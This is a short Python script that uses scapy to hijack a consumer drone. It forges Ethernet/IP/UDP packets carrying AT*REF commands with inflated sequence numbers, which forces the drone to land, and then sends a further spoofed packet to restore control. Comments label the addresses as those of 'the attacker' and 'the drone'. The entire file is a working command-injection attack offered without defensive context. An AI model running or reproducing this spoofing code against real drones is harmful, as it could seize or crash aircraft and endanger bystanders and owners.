from scapy.all import *
from time import sleep

class DroneController:
    def __init__(self, srcIP, dstIP, srcPort, dstPort, srcMAC, dstMAC, interface="wlan0"):
        self.srcIP = srcIP
        self.dstIP = dstIP
        self.srcPort = srcPort
        self.dstPort = dstPort
        self.srcMAC = srcMAC
        self.dstMAC = dstMAC
        self.interface = interface

    def send_spoofed_packets(self):
        print("Sending spoofed land packets")
        for i in range(1, 10):
            payload = "AT*REF=" + str(1000000 + i) + ",290717696\r"
            print(payload)
            spoofed_packet = Ether(src=self.srcMAC, dst=self.dstMAC) / \
                             IP(src=self.srcIP, dst=self.dstIP) / \
                             UDP(sport=self.srcPort, dport=self.dstPort) / payload
            sendp(spoofed_packet, iface=self.interface)
            sleep(0.3)

    def restore_control(self):
        print("Wait 5 seconds before restoring control")
        sleep(5)
        print("Send a spoofed packet with seq=1 to restore control")
        payload = "AT*REF=1,290717696\r"
        print(payload)
        spoofed_packet = Ether(src=self.srcMAC, dst=self.dstMAC) / \
                         IP(src=self.srcIP, dst=self.dstIP) / \
                         UDP(sport=self.srcPort, dport=self.dstPort) / payload
        sendp(spoofed_packet, iface=self.interface)

# Example usage:
if __name__ == "__main__":
    #srcIP = '192.168.1.2'  # IP of the attacker
    #dstIP = '192.168.1.1'  # IP of the drone
    #srcPort = 5556
    #dstPort = 5556
    #srcMAC = '58:44:98:13:80:6c'  # MAC of the attacker
    #dstMAC = '90:03:b7:e8:55:72'  # MAC of the drone

    #controller = DroneController(srcIP, dstIP, srcPort, dstPort, srcMAC, dstMAC)
    #controller.send_spoofed_packets()
    #controller.restore_control()
    source_IP = get_if_addr("wlan0")
    source_MAC = get_if_hwaddr("wlan0")
    print("Source IP: ", source_IP)
    print("Source MAC: ", source_MAC)